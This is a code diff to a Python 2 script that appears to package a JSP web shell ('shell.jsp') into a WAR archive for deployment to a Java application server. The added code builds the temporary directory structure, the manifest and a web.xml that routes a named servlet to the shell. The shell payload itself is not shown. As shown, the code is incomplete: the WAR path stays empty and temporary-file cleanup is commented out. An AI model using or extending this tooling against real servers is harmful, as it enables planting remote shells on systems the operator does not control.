@@ -9,8 +9,10 @@ import string
 import optparse
 import tempfile
 import shutil
+import re
 import base64
 import logging
+import commands
 
 logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
 logging.addLevelName( logging.WARNING, "\033[1;31m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
@@ -18,10 +20,43 @@ logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelN
 logger = logging.getLogger()
 
 
-def compileWar(code):
+def compileWar(code, title):
     warpath = ''
     dirpath = tempfile.mkdtemp()
 
+    logging.info('Generating temporary structure for WAR at: "%s"' % dirpath)
+
+    os.makedirs(dirpath + '/files/META-INF')
+    os.makedirs(dirpath + '/files/WEB-INF')
+    
+    with open(dirpath + '/shell.jsp', 'w') as f:
+        f.write(code)
+
+    javaver = commands.getstatusoutput('java -version')[1]
+    m = re.search('version "([^"]+)"', javaver)
+    if m:
+        javaver = m.group(1)
+        logging.info('Working with Java at version: %s' % javaver)
+    else:
+        logging.info('Could not retrieve Java version. Assuming: "1.8.0_60"')
+        javaver = '1.8.0_60'
+
+    with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
+        f.write('''Manifest-Version: 1.0
+Created-By: %s
+
+''' % javaver)
+
+    logging.info('Generating web.xml with servlet-name: "%s"' % title)
+    with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
+        f.write('''<?xml version="1.0" ?>
+<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
+    <servlet>
+        <servlet-name>%s</servlet-name>
+        <jsp-file>/shell.jsp</jsp-file>
+    </servlet>
+</web-app>
+''' % title)
 
     return (dirpath, warpath)
 
@@ -200,7 +235,7 @@ def main():
 
     try:
         if not opts.file:
-            (dirpath, warpath) = compileWar(code)
+            (dirpath, warpath) = compileWar(code, opts.title)
         else:
             warpath = opts.file
 
@@ -208,9 +243,9 @@ def main():
     except KeyboardInterrupt:
         print '\nUser interruption.'
 
-        if not opts.file and dirpath:
-            logger.info('Removing temporary WAR directory: "%s"')
-            shutil.rmtree(dirpath)
+    if not opts.file and dirpath:
+        logger.info('Removing temporary WAR directory: "%s"' % dirpath)
+        #shutil.rmtree(dirpath)
 
 
 if __name__ == '__main__':
